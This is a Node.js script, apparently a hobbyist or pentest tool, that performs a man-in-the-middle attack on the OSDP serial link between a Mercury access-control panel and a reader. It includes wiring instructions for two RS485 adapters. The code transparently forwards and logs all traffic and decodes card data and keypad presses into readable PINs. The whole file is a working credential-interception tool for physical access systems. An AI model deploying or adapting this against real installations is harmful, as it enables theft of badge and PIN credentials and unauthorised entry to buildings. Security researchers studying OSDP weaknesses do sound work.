#!/usr/bin/env node
/**
 * OSDP Man-in-the-Middle Capture
 * 
 * Uses TWO Waveshare USB-RS485 adapters to sit between panel and reader.
 * Forwards all traffic while logging everything.
 * 
 * Wiring:
 *   Mercury A+ ───── Waveshare #1 A+
 *   Mercury B- ───── Waveshare #1 B-
 *   Mercury GND ──── Waveshare #1 GND
 *   
 *   Waveshare #2 A+ ───── Reader A+
 *   Waveshare #2 B- ───── Reader B-
 *   Waveshare #2 GND ──── Reader GND
 *   
 *   (Reader needs 12V power separately)
 * 
 * Usage: node osdp-mitm.js [panelPort] [readerPort] [baudRate]
 * 
 * Example: node osdp-mitm.js /dev/ttyUSB0 /dev/ttyUSB1 9600
 */

const { SerialPort } = require('serialport');
const fs = require('fs');

const PANEL_PORT = process.argv[2] || '/dev/ttyUSB0';
const READER_PORT = process.argv[3] || '/dev/ttyUSB1';
const BAUD = parseInt(process.argv[4]) || 9600;
const LOG_FILE = `osdp-mitm-${Date.now()}.log`;

console.log('='.repeat(60));
console.log('OSDP Man-in-the-Middle Capture');
console.log('='.repeat(60));
console.log(`Panel Port:  ${PANEL_PORT} (connects to Mercury)`);
console.log(`Reader Port: ${READER_PORT} (connects to Reader)`);
console.log(`Baud Rate:   ${BAUD}`);
console.log(`Log File:    ${LOG_FILE}`);
console.log('='.repeat(60));
console.log('');
console.log('Traffic will be forwarded transparently.');
console.log('Press keys on the reader to capture keypad data.');
console.log('Press Ctrl+C to stop.');
console.log('');

// Buffers for packet assembly
let panelBuffer = Buffer.alloc(0);
let readerBuffer = Buffer.alloc(0);

// Command/Reply names
const COMMANDS = {
  0x60: 'POLL', 0x61: 'ID', 0x62: 'CAP', 0x64: 'LSTAT',
  0x65: 'ISTAT', 0x66: 'OSTAT', 0x67: 'RSTAT', 0x69: 'LED',
  0x6A: 'BUZ', 0x6B: 'TEXT', 0x6C: 'COMSET', 0x75: 'KEYSET',
  0x76: 'CHLNG', 0x77: 'SCRYPT',
};

const REPLIES = {
  0x40: 'ACK', 0x41: 'NAK', 0x45: 'PDID', 0x46: 'PDCAP',
  0x48: 'LSTATR', 0x50: 'RAW', 0x51: 'FMT', 0x53: 'KEYPAD',
  0x76: 'CCRYPT', 0x78: 'RMAC_I',
};

// Logging
function log(msg) {
  const ts = new Date().toISOString();
  const line = `[${ts}] ${msg}`;
  console.log(line);
  fs.appendFileSync(LOG_FILE, line + '\n');
}

function logRaw(direction, data) {
  fs.appendFileSync(LOG_FILE, `[${new Date().toISOString()}] ${direction} RAW: ${data.toString('hex').toUpperCase()}\n`);
}

// Parse packet from buffer
function parsePacket(data) {
  if (data.length < 6) return null;
  
  const somIndex = data.indexOf(0x53);
  if (somIndex === -1) return null;
  if (data.length < somIndex + 4) return null;
  
  const length = data[somIndex + 2] | (data[somIndex + 3] << 8);
  if (length < 6 || length > 256) {
    // Invalid length, skip this byte
    return { skip: somIndex + 1, remaining: data.slice(somIndex + 1) };
  }
  
  if (data.length < somIndex + length) return null; // Need more data
  
  const packet = data.slice(somIndex, somIndex + length);
  const address = packet[1] & 0x7F;
  const isReply = (packet[1] & 0x80) !== 0;
  const ctrl = packet[4];
  const seq = ctrl & 0x03;
  const hasSCB = (ctrl & 0x08) !== 0;
  
  let cmdOffset = 5;
  let scbLen = 0;
  if (hasSCB && packet.length > 6) {
    scbLen = packet[5];
    cmdOffset = 5 + scbLen;
  }
  
  if (cmdOffset >= packet.length - 2) {
    return { skip: somIndex + 1, remaining: data.slice(somIndex + 1) };
  }
  
  const command = packet[cmdOffset];
  const cmdData = packet.slice(cmdOffset + 1, length - 2);
  
  return {
    raw: packet,
    address,
    isReply,
    sequence: seq,
    hasSCB,
    scbLen,
    command,
    data: cmdData,
    remaining: data.slice(somIndex + length)
  };
}

// Format and display interesting packets
function displayPacket(direction, parsed) {
  const cmdName = parsed.isReply 
    ? (REPLIES[parsed.command] || `0x${parsed.command.toString(16).toUpperCase()}`)
    : (COMMANDS[parsed.command] || `0x${parsed.command.toString(16).toUpperCase()}`);
  
  // Skip boring POLLs and ACKs for console (still logged)
  const isBoring = (parsed.command === 0x60 || parsed.command === 0x40);
  
  const prefix = direction === 'PANEL->READER' ? '>>>' : '<<<';
  const line = `${prefix} ${direction} | ${cmdName} | Addr:${parsed.address} Seq:${parsed.sequence}${parsed.hasSCB ? ' [SECURE]' : ''}`;
  
  if (!isBoring) {
    console.log('');
    console.log('─'.repeat(60));
    console.log(line);
    console.log(`    HEX: ${parsed.raw.toString('hex').toUpperCase()}`);
    
    // Decode keypad/raw data
    if (parsed.command === 0x50 && parsed.data.length >= 4) {
      // osdp_RAW
      const reader = parsed.data[0];
      const format = parsed.data[1];
      const bitCount = parsed.data[2] | (parsed.data[3] << 8);
      const cardData = parsed.data.slice(4);
      
      console.log(`    ┌─ osdp_RAW`);
      console.log(`    ├─ Reader: ${reader}`);
      console.log(`    ├─ Format: ${format} (${format === 1 ? 'Wiegand' : format === 0 ? 'Raw' : 'Other'})`);
      console.log(`    ├─ Bit Count: ${bitCount}`);
      console.log(`    ├─ Data HEX: ${cardData.toString('hex').toUpperCase()}`);
      console.log(`    └─ Data BIN: ${[...cardData].map(b => b.toString(2).padStart(8, '0')).join(' ')}`);
      
    } else if (parsed.command === 0x53 && parsed.data.length >= 2) {
      // osdp_KEYPAD
      const reader = parsed.data[0];
      const keyCount = parsed.data[1];
      const keys = parsed.data.slice(2);
      
      console.log(`    ┌─ osdp_KEYPAD`);
      console.log(`    ├─ Reader: ${reader}`);
      console.log(`    ├─ Key Count: ${keyCount}`);
      console.log(`    ├─ Keys HEX: ${keys.toString('hex').toUpperCase()}`);
      console.log(`    ├─ Keys ASCII: "${keys.toString('ascii').replace(/[^\x20-\x7E]/g, '?')}"`);
      console.log(`    └─ Keys BIN: ${[...keys].map(b => `0x${b.toString(16).toUpperCase().padStart(2,'0')}(${b.toString(2).padStart(8,'0')})`).join(' ')}`);
      
      // Try Wiegand 8-bit decode
      const w8 = { 0xF0:'0', 0xE1:'1', 0xD2:'2', 0xC3:'3', 0xB4:'4', 0xA5:'5', 0x96:'6', 0x87:'7', 0x78:'8', 0x69:'9', 0x5A:'*', 0x4B:'#' };
      const decoded = [...keys].map(b => w8[b] || '?').join('');
      if (!decoded.includes('?')) {
        console.log(`    └─ Wiegand 8-bit: "${decoded}"`);
      }
    }
    console.log('');
  }
  
  // Always log to file
  fs.appendFileSync(LOG_FILE, `[${new Date().toISOString()}] ${line}\n`);
  fs.appendFileSync(LOG_FILE, `    HEX: ${parsed.raw.toString('hex').toUpperCase()}\n`);
  if (parsed.data.length > 0) {
    fs.appendFileSync(LOG_FILE, `    DATA: ${parsed.data.toString('hex').toUpperCase()}\n`);
  }
}

// Open both ports
const panelPort = new SerialPort({ 
  path: PANEL_PORT, 
  baudRate: BAUD,
  dataBits: 8,
  stopBits: 1,
  parity: 'none'
});

const readerPort = new SerialPort({ 
  path: READER_PORT, 
  baudRate: BAUD,
  dataBits: 8,
  stopBits: 1,
  parity: 'none'
});

panelPort.on('error', (err) => {
  console.error(`Panel port error: ${err.message}`);
  process.exit(1);
});

readerPort.on('error', (err) => {
  console.error(`Reader port error: ${err.message}`);
  process.exit(1);
});

let panelReady = false;
let readerReady = false;

function checkReady() {
  if (panelReady && readerReady) {
    log('Both ports open - MITM active!\n');
    console.log('Waiting for traffic... (POLLs/ACKs hidden, keypad data shown)\n');
  }
}

panelPort.on('open', () => {
  log(`Panel port opened: ${PANEL_PORT}`);
  panelReady = true;
  checkReady();
});

readerPort.on('open', () => {
  log(`Reader port opened: ${READER_PORT}`);
  readerReady = true;
  checkReady();
});

// Panel -> Reader (commands from Mercury)
panelPort.on('data', (data) => {
  logRaw('PANEL->READER', data);
  
  // Forward immediately
  readerPort.write(data);
  
  // Parse for display
  panelBuffer = Buffer.concat([panelBuffer, data]);
  let parsed;
  while ((parsed = parsePacket(panelBuffer)) !== null) {
    if (parsed.skip) {
      panelBuffer = parsed.remaining;
      continue;
    }
    displayPacket('PANEL->READER', parsed);
    panelBuffer = parsed.remaining;
  }
  if (panelBuffer.length > 512) panelBuffer = Buffer.alloc(0);
});

// Reader -> Panel (responses from reader)
readerPort.on('data', (data) => {
  logRaw('READER->PANEL', data);
  
  // Forward immediately
  panelPort.write(data);
  
  // Parse for display
  readerBuffer = Buffer.concat([readerBuffer, data]);
  let parsed;
  while ((parsed = parsePacket(readerBuffer)) !== null) {
    if (parsed.skip) {
      readerBuffer = parsed.remaining;
      continue;
    }
    displayPacket('READER->PANEL', parsed);
    readerBuffer = parsed.remaining;
  }
  if (readerBuffer.length > 512) readerBuffer = Buffer.alloc(0);
});

// Ctrl+C
process.on('SIGINT', () => {
  console.log('\n\nMITM stopped.');
  console.log(`Log saved to: ${LOG_FILE}`);
  panelPort.close();
  readerPort.close();
  process.exit(0);
});
